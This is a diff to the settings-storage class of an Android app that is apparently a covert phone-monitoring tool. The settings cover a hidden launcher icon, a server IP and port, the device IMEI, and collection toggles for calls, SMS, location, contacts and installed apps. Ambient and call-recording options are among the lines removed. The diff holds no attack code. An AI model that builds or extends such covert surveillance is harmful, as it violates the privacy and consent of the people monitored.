@@ -16,7 +16,9 @@ import io.reactivex.Single;
  */
 
 public class Preferences {
+    private Gson gson;
     private Context context;
+
     private final String PREFS_NAME = "store";
     private SharedPreferences prefs;
     private final String visit_key = "is_visited";
@@ -27,46 +29,31 @@ public class Preferences {
     private final String baseDeviceInfo = "base_device_info";
     private final String hideIcon = "is_hide_icon";
     private final String isAllDeviceInfo = "is_all_device_info";
-    private Gson gson;
-    private final String account = "account";
-    private final String timeWorker = "time_worker";
-
 
     //-------------------initial data------------------------
-    private final String initial_code = "initial_code";
     private final String device = "device";
-
-    private final String firstToken = "first_token";
-    private final String secondToken = "second_token" +
-            "";
+    private final String imei = "imei";
     private final String periodRequest = "period_request";
 
-    private String keyForRecord = "key_record";
     //------------variable settings-----------------------
     private final String call = "call";
     private final String sms = "sms";
-    private final String historyBrouser = "history_brouser";
     private final String location = "location";
     private final String locationMode = "location_mode";
     private final String dispatchMode = "dispatch_mode";
-    private final String image = "image";
-    private final String audio = "audio";
-    private final String callRecord = "call_record";
-    private final String environmentRecord = "environment_record";
-    private final String callEnvironmentRecord = "call_environment_record";
+    private final String locationUpdateTime = "location_update_time";
+
     private final String callList = "call_list";
     private final String smsList = "sms_list";
-    private final String contactList = "contactcom.shadiz.usergin.shadowview.utils.Preferences.callList_list";
     private final String appList = "app_list";
-    private final String duration = "duration";
-    private final String imei = "imei";
+    private final String phoneBook = "phone_book";
 
 
     @Inject
     public Preferences(Context context) {
         prefs = context.getSharedPreferences(PREFS_NAME, 0);
         gson = new Gson();
-        context = context;
+        this.context = context;
     }
 
     public Single<String> getIpAddress() {
@@ -85,18 +72,10 @@ public class Preferences {
     }
 
     public Single<String> setPort(String port) {
-        if (prefs.edit().putString(port, port).commit())
+        if (prefs.edit().putString(this.port, port).commit())
             return Single.just(port);
         else
             return Single.just("");
-    }
-
-    public String getInitialCode() {
-        return prefs.getString(initial_code, null);
-    }
-
-    public void setInitialCode(String mInitialCode) {
-        prefs.edit().putString(initial_code, mInitialCode).apply();
     }
 
     public void setDevice(String mDevice) {
@@ -121,22 +100,6 @@ public class Preferences {
         return prefs.getString(imei, null);
     }
 
-    public String getFirstToken() {
-        return prefs.getString(firstToken, null);
-    }
-
-    public void setFirstToken(String mFirstToken) {
-        prefs.edit().putString(firstToken, mFirstToken).apply();
-    }
-
-    public String getSecondToken() {
-        return prefs.getString(secondToken, null);
-    }
-
-    public void setSecondToken(String mSecondToken) {
-        prefs.edit().putString(secondToken, mSecondToken).apply();
-    }
-
     public String getPeriodRequest() {
         return prefs.getString(periodRequest, null);
     }
@@ -145,143 +108,85 @@ public class Preferences {
         prefs.edit().putString(periodRequest, mPeriodRequest).apply();
     }
 
-
-    public int getDuration() {
-        return prefs.getInt(duration, 0);
+    public int getCall() {
+        return prefs.getInt(call, 0);
     }
 
-    public void setDuration(int mDuration) {
-        prefs.edit().putInt(duration, mDuration).apply();
-    }
-
-
-    public String getCall() {
-        return prefs.getString(call, "0");
-    }
-
-    public void setCall(String mCall) {
-        prefs.edit().putString(call, mCall).apply();
+    public void setCall(int call) {
+        prefs.edit().putInt(this.call, call).apply();
     }
 
     public int getSms() {
         return prefs.getInt(sms, 0);
     }
 
-    public void setSms(int mSms) {
-        prefs.edit().putInt(call, mSms).apply();
+    public void setSms(int sms) {
+        prefs.edit().putInt(this.sms, sms).apply();
     }
 
-    public String getHistoryBrouser() {
-        return prefs.getString(historyBrouser, "0");
+    public int getLocation() {
+        return prefs.getInt(location, 0);
     }
 
-    public void setHistoryBrouser(String mHistoryBrouser) {
-        prefs.edit().putString(historyBrouser, mHistoryBrouser).apply();
+    public void setLocation(int location) {
+        prefs.edit().putInt(this.location, location).apply();
     }
 
-    public String getLocation() {
-        return prefs.getString(location, "0");
-    }
-
-    public void setLocation(String mLocation) {
-        prefs.edit().putString(location, mLocation).apply();
-    }
-
-    public String getModeLocation() {
-        return prefs.getString(locationMode, "0");
+    public int getModeLocation() {
+        return prefs.getInt(locationMode, 0);
 
     }
 
-    public void setModeLocation(String mModeLocation) {
-        prefs.edit().putString(locationMode, mModeLocation).apply();
+    public void setModeLocation(int locationMode) {
+        prefs.edit().putInt(this.locationMode, locationMode).apply();
     }
 
-    public String getDispatchMode() {
-        return prefs.getString(dispatchMode, "0");
+    public int getDispatchMode() {
+        return prefs.getInt(dispatchMode, 0);
     }
 
-    public void setDispatchMode(String mDispatch) {
-        prefs.edit().putString(dispatchMode, mDispatch).apply();
+    public void setDispatchMode(int dispatch) {
+        prefs.edit().putInt(dispatchMode, dispatch).apply();
     }
 
-    public String getImage() {
-        return prefs.getString(image, "0");
+    public int getLocationUpdateTime() {
+        return prefs.getInt(locationUpdateTime, 0);
     }
 
-    public void setImage(String mImage) {
-        prefs.edit().putString(image, mImage).apply();
+    public void setLocationUpdateTime(int time) {
+        prefs.edit().putInt(this.locationUpdateTime, time).apply();
     }
 
-    public String getAudio() {
-        return prefs.getString(audio, "0");
+    public int getCallList() {
+        return prefs.getInt(callList, 0);
     }
 
-    public void setAudio(String mAudio) {
-        prefs.edit().putString(audio, mAudio).apply();
+    public void setCallList(int callList) {
+        prefs.edit().putInt(this.callList, callList).apply();
     }
 
-    public String getCallRecord() {
-        return prefs.getString(callRecord, "0");
+    public int getSmsList() {
+        return prefs.getInt(smsList, 0);
     }
 
-    public void setCallRecord(String mCallRecord) {
-        prefs.edit().putString(callRecord, mCallRecord).apply();
+    public void setSmsList(int smsList) {
+        prefs.edit().putInt(this.smsList, smsList).apply();
     }
 
-    public String getRecordEnvironment() {
-        return prefs.getString(environmentRecord, "0");
+    public int getAppList() {
+        return prefs.getInt(appList, 0);
     }
 
-    public void setEnvironmentRecord(String mEnvironmentRecord) {
-        prefs.edit().putString(environmentRecord, mEnvironmentRecord).apply();
+    public void setAppList(int listApp) {
+        prefs.edit().putInt(appList, listApp).apply();
     }
 
-    public String getCallEnvironmentRecord() {
-        return prefs.getString(callEnvironmentRecord, "0");
+    public void setPhoneBook(int phoneBook) {
+        prefs.edit().putInt(this.phoneBook, phoneBook).apply();
     }
 
-    public void setCallEnvironmentRecord(String mCallEnvironmentRecord) {
-        prefs.edit().putString(callEnvironmentRecord, mCallEnvironmentRecord).apply();
-    }
-
-    public String getCallList() {
-        return prefs.getString(callList, "0");
-    }
-
-    public void setCallList(String mCallList) {
-        prefs.edit().putString(callList, mCallList).apply();
-    }
-
-    public String getSmsList() {
-        return prefs.getString(smsList, "0");
-    }
-
-    public void setSmsList(String mSmsList) {
-        prefs.edit().putString(smsList, mSmsList).apply();
-    }
-
-    public String getContactList() {
-        return prefs.getString(contactList, "0");
-    }
-
-    public void setContactList(String mContactList) {
-        prefs.edit().putString(contactList, mContactList).apply();
-    }
-
-    public String getAppList() {
-        return prefs.getString(appList, "0");
-    }
-
-    public void setAppList(String mListApp) {
-        prefs.edit().putString(appList, mListApp).apply();
-    }
-
-    public int getAccount() {
-        return prefs.getInt(account, -1);
-    }
-
-    public void setAccount(int id) {
-        prefs.edit().putInt(account, id).apply();
+    public int getPhoneBook() {
+        return prefs.getInt(phoneBook, 0);
     }
 
     public boolean isVisited() {
@@ -329,11 +234,4 @@ public class Preferences {
         edit.commit();
     }
 
-    public String getKeyForRecord() {
-        return prefs.getString(keyForRecord, null);
-    }
-
-    public void setKeyForRecord(String mKeyForRecord) {
-        prefs.edit().putString(keyForRecord, mKeyForRecord).apply();
-    }
 }
